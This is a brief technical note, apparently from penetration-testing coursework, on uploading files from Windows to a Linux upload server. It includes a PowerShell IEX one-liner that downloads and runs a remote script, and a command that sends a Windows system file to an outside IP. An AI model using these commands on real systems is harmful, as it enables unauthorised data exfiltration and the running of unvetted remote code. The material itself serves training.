PowerShell Web Uploads
########################

Date: 2024-11-02 17:50


Status:


Create a temporary FTP server on Linux
****************************************

Sometimes you need a file upload web server running to receive files:

To install an upload server you can install it with :

.. code-block:: console

   pip3 install uploadserver

And then activate it with:

.. code-block:: console

   python3 -m uploadserver

Use PowerShell to upload the file to Linux
*********************************************

.. code-block:: console

   PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

   PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

   [+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
   [+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373

References
***********
